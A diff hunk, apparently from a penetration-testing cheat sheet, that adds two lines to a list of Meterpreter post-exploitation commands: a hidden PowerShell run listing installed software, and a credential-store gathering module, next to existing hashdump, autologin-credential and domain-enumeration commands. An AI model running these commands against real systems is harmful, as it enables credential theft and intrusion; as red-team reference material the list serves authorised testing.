@@ -392,11 +392,13 @@ powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('C:\Common Applica
 getuid
 getprivs
 sysinfo
+execute -H -i -f powershell.exe -a "-Command Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher"
 arp
 ipconfig
 run post/windows/gather/enum_domain
 run post/windows/gather/enum_domains
 run post/windows/gather/enum_unattend
+run post/windows/gather/credentials/enum_cred_store
 run post/windows/gather/credentials/windows_autologin
 hashdump
 use priv
